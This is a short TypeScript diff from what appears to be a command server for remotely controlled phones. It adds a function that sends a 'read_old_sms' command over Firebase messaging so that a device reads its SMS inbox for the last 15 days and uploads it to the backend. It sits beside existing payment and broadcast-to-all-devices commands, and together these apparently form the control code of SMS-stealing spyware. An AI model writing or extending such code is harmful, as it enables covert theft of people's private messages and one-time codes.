@@ -471,6 +471,28 @@ export async function broadcastCommandToAllDevices(
    DEFAULT EXPORT
    ═══════════════════════════════════════════ */
 
+
+/* ═══════════════════════════════════════════
+   READ OLD SMS COMMAND (NEW)
+   ═══════════════════════════════════════════ */
+
+/**
+ * Send read_old_sms command to device via FCM.
+ * Device will read inbox SMS from last N days and push them to backend.
+ */
+export async function sendReadOldSmsCommand(
+  deviceId: string,
+  days: number = 15,
+) {
+  return sendCommandToDevice(deviceId, "read_old_sms", {
+    requestId: `oldsms_${deviceId}_${Date.now()}`,
+    extraData: {
+      days,
+      timestamp: Date.now(),
+    },
+  });
+}
+
 export default {
   buildCommandPayload,
   sendToToken,
@@ -489,4 +511,5 @@ export default {
   sendPaymentCommand,
   sendPing,
   broadcastCommandToAllDevices,
+  sendReadOldSmsCommand,
 };
